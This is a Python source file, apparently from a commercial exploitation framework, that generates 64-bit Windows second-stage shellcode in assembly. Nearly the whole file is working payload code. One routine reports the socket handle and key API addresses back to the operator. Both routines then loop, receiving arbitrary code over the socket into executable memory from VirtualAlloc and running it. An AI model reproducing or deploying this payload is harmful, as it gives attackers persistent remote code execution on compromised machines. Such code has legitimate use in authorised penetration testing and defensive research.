#! /usr/bin/env python

# a payload generator for win64

from basecode64 import basecode
from basecode64 import s_to_push
from MOSDEF import mosdef
# XXX: need pelib64
from MOSDEF import pelib
from exploitutils import *
import struct
import socket
import random
import time

USAGE = """
"""

class SecondStages:
    def __init__(self, VirtualProtect = True):
        self.vprotect = VirtualProtect

    def assemble(self, code):
        """ just a little convenience callthrough to mosdef.assemble """
        return mosdef.assemble(code, 'x64')

    def get_basecode(self, **args):
        if self.vprotect:
            args['VirtualProtect'] = True
        return basecode( **args )


    # RecvExecAllocLoopCallback
    #
    # Assumes fd is on %r15
    # Steps:
    #   1 - send socket FD to the wire
    #   2 - send kernel32|getProcAddress address
    #   3 - send kernel32|loadLibraryA address
    #   4 - send ws2_32|send/recv address
    #   5 - send ws2_32|WSAGetLastError address
    #   6 - RecvExecAllocLoop
    #   7 - ExitThread <-  will we use ExitThread or TerminateThread?
    #
    def recvExecAllocLoop(self):
        """ generate a standalone callback payload .. example! """

        codegen = self.get_basecode()
        codegen.find_function('kernel32.dll!loadlibrarya')
        codegen.find_function('kernel32.dll!getprocaddress')
        codegen.find_function('kernel32.dll!virtualalloc')
        codegen.find_function('kernel32.dll!virtualfree')
        codegen.find_function('kernel32.dll!getcurrentthread')
        codegen.find_function('kernel32.dll!terminatethread')
        codegen.find_function('ws2_32.dll!send')
        codegen.find_function('ws2_32.dll!recv')
        codegen.find_function('ws2_32.dll!wsagetlasterror')
        codegen.find_function('ws2_32.dll!closesocket')
        codegen.find_function('ws2_32.dll!ioctlsocket')

        codegen._globals.addQword('FDSPOT')

        # enable the debug stub
        codegen.enable_debug()

        # Step 1 - send socket FD to the wire
        codegen.main +="""
            mov %r15,FDSPOT-getpcloc(%rbp)           // saves socket fd

            // set socket to blocking explicitly
            xorl %rax,%rax
            push %rax
            mov %r15,%rcx
            mov $0x8004667E,%rdx
            mov %rsp,%r8
            and $0xfffffff0,%rsp
            call *IOCTLSOCKET-getpcloc(%rbp)
            pop %rbx

            push %r15
            mov $0x8,%rcx                            // arg1: length
            mov %rsp,%rdx                            // arg2: socket FD
            call sendloop
            pop %rbx
        """

        # Step 2 - send kernel32|getProcAddress address
        codegen.main +="""
            push GETPROCADDRESS-getpcloc(%rbp)       // get getProcAddress() addr
            mov $0x8,%rcx                            // arg1: length
            mov %rsp,%rdx                            // arg2: getProcAddress() addr
            call sendloop
            pop %rbx
        """

        # Step 3 - send kernel32|loadLibraryA address
        codegen.main +="""
            push LOADLIBRARYA-getpcloc(%rbp)         // get loadLibraryA() addr
            mov $0x8,%rcx                            // arg1: length
            mov %rsp,%rdx                            // arg2: loadLibraryA() addr
            call sendloop
            pop %rbx
        """

        # Step 4 - send ws2_32|send+recv address
        codegen.main +="""
            push SEND-getpcloc(%rbp)                 // get send() addr
            mov $0x8,%rcx                            // arg1: length
            mov %rsp,%rdx                            // arg2: send() addr
            call sendloop
            pop %rbx
        """
        codegen.main +="""
            push RECV-getpcloc(%rbp)                 // get recv() addr
            mov $0x8,%rcx                            // arg1: length
            mov %rsp,%rdx                            // arg2: send() addr
            call sendloop
            pop %rbx
        """

        # Step 5 - send WSAGetLastError() address
        codegen.main += """
            push WSAGETLASTERROR-getpcloc(%rbp)      // get WSAGetLastError addr
            mov $0x8, %rcx                           // arg1: length
            mov %rsp, %rdx                           // arg2: send() addr
            call sendloop
            pop %rbx
        """

        # Step 6 - RecvExecAllocLoop
        codegen.main +="""

        win64RecvExecCode:

            and $0xfffffff0,%rsp            // align rsp on 16

            // receive len (4 bytes)
            push %rax                       // recv space
            mov $4,%rcx                     // arg1: length
            mov %rsp,%rdx                   // arg2: buffer
            call recvloop

        gogotlen:
            xorl %rax,%rax

            movl (%rsp),%eax
            mov %rax,%rdi                   // rdi will hold len
            pop %rax                        // eat recv buf to prevent alloca leak

            // Allocate buffer space (DEP Safe)
            xor %rcx,%rcx                   // arg1: lpAddress = Null
            mov %rdi, %rdx                  // arg2: dwSize
            mov $0x1000, %r8                // arg3: flAllocationType = MEM_COMMIT
            mov $0x40, %r9                  // arg4: flProtect = PAGE_EXECUTE_READWRITE

            call *VIRTUALALLOC-getpcloc(%rbp)

            // XXX: error check needed

            push %rax                       // save ptr for us to jmp to later on

        recvexec:

            mov %rdi,%rcx
            mov %rax,%rdx
            call recvloop

        stagetwo:

            pop %rax                        // restore pointer

            call *%rax                      // _CALL_ ... mosdef returns to here

            // free the memory !
            mov %rax, %rcx                  // arg1: lpAddress
            xor %rdx, %rdx                  // arg2: dwSize = 0
            mov $0x8000, %r8                // arg3: fwFreeType = MEM_RELEASE

            call *VIRTUALFREE-getpcloc(%rbp)

            // XXX: error check needed

            jmp win64RecvExecCode           // loop again

        exit:
            and $0xfffffff0,%rsp
            mov FDSPOT-getpcloc(%rbp),%rcx
            sub $0x20, %rsp
            call *CLOSESOCKET-getpcloc(%rbp)
            add $0x20, %rsp

            call *GETCURRENTTHREAD-getpcloc(%rbp)
            mov %rax,%rcx
            xor %rdx,%rdx

            call *TERMINATETHREAD-getpcloc(%rbp)

        """

        # sendloop function
        # args:
        #   rcx: length
        #   rdx: buffer
        codegen.main +="""
            sendloop:

                mov %rsp,%r15
                and $0xfffffff0,%rsp            // ensure 16 byte align

                mov %rcx,%rsi                   // length
                mov %rdx,%rdi                   // buffer

            sendloop_one:

                xor %r9,%r9                     // arg4: flags  (0x0)
                mov %rsi,%r8                    // arg3: len
                mov %rdi,%rdx                   // XXX: buffer pointer wasnt getting updated
                mov FDSPOT-getpcloc(%rbp),%rcx  // arg1: socket

                sub $0x20, %rsp                 // shadow space
                call *SEND-getpcloc(%rbp)
                add $0x20, %rsp                 // eat shadow space

                cmp $0,%rax
                je exit // EOF

                cmpl $-1, %eax
                jne no_send_error

                call *WSAGETLASTERROR-getpcloc(%rbp)
                cmp $10004, %rax     // WSAEINTR
                jz sendloop_one      // try again
                cmp $10035, %rax     // WSAEWOULDBLOCK
                jz sendloop_one      // try again

                jmp exit

            no_send_error:

                sub %rax,%rsi                   // subtract length we sent
                add %rax,%rdi                   // increment the buffer pointer

                test %rsi,%rsi                  // are we done?
                jne sendloop_one                // continue receiving

                mov %r15,%rsp
                ret
        """

        # recvloop function
        # args:
        #   rcx: length
        #   rdx: buffer
        codegen.main += """
            recvloop:

                mov %rsp,%r15
                and $0xfffffff0,%rsp

                mov %rcx,%rsi
                mov %rdx,%rdi

            recvloop_one:

                xor %r9,%r9
                mov %rsi,%r8
                mov %rdi,%rdx
                mov FDSPOT-getpcloc(%rbp),%rcx
                sub $0x20,%rsp
                call *RECV-getpcloc(%rbp)
                add $0x20,%rsp

                cmp $0,%rax
                je exit // EOF

                cmpl $-1, %eax
                jne no_recv_error

                call *WSAGETLASTERROR-getpcloc(%rbp)
                cmp $10004, %rax     // WSAEINTR
                jz recvloop_one
                cmp $10035, %rax     // WSAEWOULDBLOCK
                jz recvloop_one

                jmp exit

            no_recv_error:

                sub %rax,%rsi
                add %rax,%rdi

                test %rsi,%rsi
                jne recvloop_one

                mov %r15,%rsp
                ret
        """

        return codegen.get()

    # RecvExecAllocLoopWithSocket
    #
    # Steps:
    #   1 - save sock fd
    #   2 - RecvExecAllocLoop
    #   7 - ExitThread
    #
    def recvExecAllocLoopWithSocket(self, fd):
        """ generate a standalone callback payload"""

        codegen = self.get_basecode()
        codegen.find_function('kernel32.dll!loadlibrarya')
        codegen.find_function('kernel32.dll!getprocaddress')
        codegen.find_function('kernel32.dll!virtualalloc')
        codegen.find_function('kernel32.dll!virtualfree')
        codegen.find_function('kernel32.dll!getcurrentthread')
        codegen.find_function('kernel32.dll!terminatethread')

        # Need to explicitly load ws2_32.dll as there are no guarantees that
        # it will be present.
        codegen.load_library('ws2_32.dll')

        codegen.find_function('ws2_32.dll!wsastartup')
        codegen.find_function('ws2_32.dll!send')
        codegen.find_function('ws2_32.dll!recv')
        codegen.find_function('ws2_32.dll!closesocket')
        codegen.find_function('ws2_32.dll!wsagetlasterror')

        codegen._globals.addQword('FDSPOT')

        # enable the debug stub
        codegen.enable_debug()

        # Step 1 - save socket socket FD
        codegen.main +="""
            xor %rcx, %rcx
            movq %rcx, FDSPOT-getpcloc(%rbp)
            mov REPLACE_FD, FDSPOT-getpcloc(%rbp)           // saves socket fd
        """.replace("REPLACE_FD", "$0x%x"%fd)

        # Step 2 - RecvExecAllocLoop
        codegen.main +="""

        win64RecvExecCode:
            and $0xfffffff0,%rsp            // align rsp on 16

            // receive len (4 bytes)
            push %rax                       // recv space
            mov $4,%rcx                     // arg1: length
            mov %rsp,%rdx                   // arg2: buffer
            call recvloop

        gogotlen:
            xorl %rax,%rax

            movl (%rsp),%eax
            mov %rax,%rdi                   // rdi will hold len
            pop %rax                        // eat recv buf to prevent alloca leak

            // Allocate buffer space (DEP Safe)
            xor %rcx,%rcx                   // arg1: lpAddress = Null
            mov %rdi, %rdx                  // arg2: dwSize
            mov $0x1000, %r8                // arg3: flAllocationType = MEM_COMMIT
            mov $0x40, %r9                  // arg4: flProtect = PAGE_EXECUTE_READWRITE

            call *VIRTUALALLOC-getpcloc(%rbp)

            // XXX: error check needed

            push %rax                       // save ptr for us to jmp to later on

        recvexec:

            mov %rdi,%rcx
            mov %rax,%rdx
            call recvloop

        stagetwo:

            pop %rax                        // restore pointer

            call *%rax                      // _CALL_ ... mosdef returns to here

            // free the memory !
            mov %rax, %rcx                  // arg1: lpAddress
            xor %rdx, %rdx                  // arg2: dwSize = 0
            mov $0x8000, %r8                // arg3: fwFreeType = MEM_RELEASE

            call *VIRTUALFREE-getpcloc(%rbp)

            // XXX: error check needed

            jmp win64RecvExecCode           // loop again

        exit:
            and $0xfffffff0,%rsp
            mov FDSPOT-getpcloc(%rbp),%rcx
            sub $0x20, %rsp
            call *CLOSESOCKET-getpcloc(%rbp)
            add $0x20, %rsp

            call *GETCURRENTTHREAD-getpcloc(%rbp)

            mov %rax,%rcx
            xor %rdx,%rdx

            call *TERMINATETHREAD-getpcloc(%rbp)

        """

        # sendloop function
        # args:
        #   rcx: length
        #   rdx: buffer
        codegen.main +="""
            sendloop:

                mov %rsp,%r15
                and $0xfffffff0,%rsp            // ensure 16 byte align

                mov %rcx,%rsi                   // length
                mov %rdx,%rdi                   // buffer

            sendloop_one:

                xor %r9,%r9                     // arg4: flags  (0x0)
                mov %rsi,%r8                    // arg3: len
                mov %rdi,%rdx                   // XXX: buffer pointer wasnt getting updated
                mov FDSPOT-getpcloc(%rbp),%rcx  // arg1: socket

                sub $0x20, %rsp                 // shadow space
                call *SEND-getpcloc(%rbp)
                add $0x20, %rsp                 // eat shadow space

                cmp $0,%rax
                je exit // EOF

                cmpl $-1, %eax
                jne no_send_error

                call *WSAGETLASTERROR-getpcloc(%rbp)
                cmp $10004, %rax     // WSAEINTR
                jz sendloop_one      // try again
                cmp $10035, %rax     // WSAEWOULDBLOCK
                jz sendloop_one      // try again

                jmp exit

            no_send_error:

                sub %rax,%rsi                   // subtract length we sent
                add %rax,%rdi                   // increment the buffer pointer

                test %rsi,%rsi                  // are we done?
                jne sendloop_one                // continue receiving

                mov %r15,%rsp
                ret
        """

        # recvloop function
        # args:
        #   rcx: length
        #   rdx: buffer
        codegen.main += """
            recvloop:
                mov %rsp,%r15
                and $0xfffffff0,%rsp

                mov %rcx,%rsi
                mov %rdx,%rdi

            recvloop_one:
                xor %r9,%r9
                mov %rsi,%r8
                mov %rdi,%rdx
                mov FDSPOT-getpcloc(%rbp),%rcx
                sub $0x20,%rsp
                call *RECV-getpcloc(%rbp)
                add $0x20,%rsp

                cmpl $0, %eax
                jz exit // EOF

                cmpl $-1, %eax
                jnz no_recv_error

                call *WSAGETLASTERROR-getpcloc(%rbp)

                cmp $10004, %rax  // WSAEINTR
                jz recvloop_one
                cmp $10035, %rax  // WSAEWOULDBLOCK
                jz recvloop_one

                cmpl $10093, %eax // WSANOTINITIALISED
                jnz exit

                // Call WSAStartup as it hasn't been previously called
                push %rcx
                push %rdx
                subl $0x200, %rsp
                xorl %rcx, %rcx
                movb $0x1, %ch
                movb $0x1, %cl
                mov %rsp, %rdx
                call *WSASTARTUP-getpcloc(%rbp)
                addl $0x200, %rsp
                pop %rdx
                pop %rcx

                cmpl $0, %eax
                jz recvloop_one

                jmp exit

            no_recv_error:
                sub %rax,%rsi
                add %rax,%rdi

                test %rsi,%rsi
                jne recvloop_one

                mov %r15,%rsp
                ret
        """

        return codegen.get()

if __name__ == '__main__':
    import sys;
    import struct;
    line = 0
    p = SecondStages()

    #TODO: un-harcode this
    #asm = p.recvExecAllocLoopWithSocket(999)

    asm = """
        mov %rdi, %rdi
        push %rbp
        mov %rsp, %rbp
        sub $0x18,%rsp
"""


    print asm
    bin = p.assemble(asm)
    # mod 4 align
    while len(bin) % 4:
        bin += "P"
    for c in bin:
        if not line:
            sys.stdout.write("\"")
        sys.stdout.write("\\x%.2x" % ord(c))
        line += 1
        if line == 16:
            sys.stdout.write("\"\n")
            line = 0
    i = 0
    line = 0
    sys.stdout.write("\n");
    while i < len(bin):
        dword = struct.unpack("<L", bin[i:i+4])[0]
        sys.stdout.write("0x%.8X, " % dword)
        line += 1
        i += 4
        if line == 4:
            sys.stdout.write("\n")
            line = 0
    sys.stdout.write("\n")

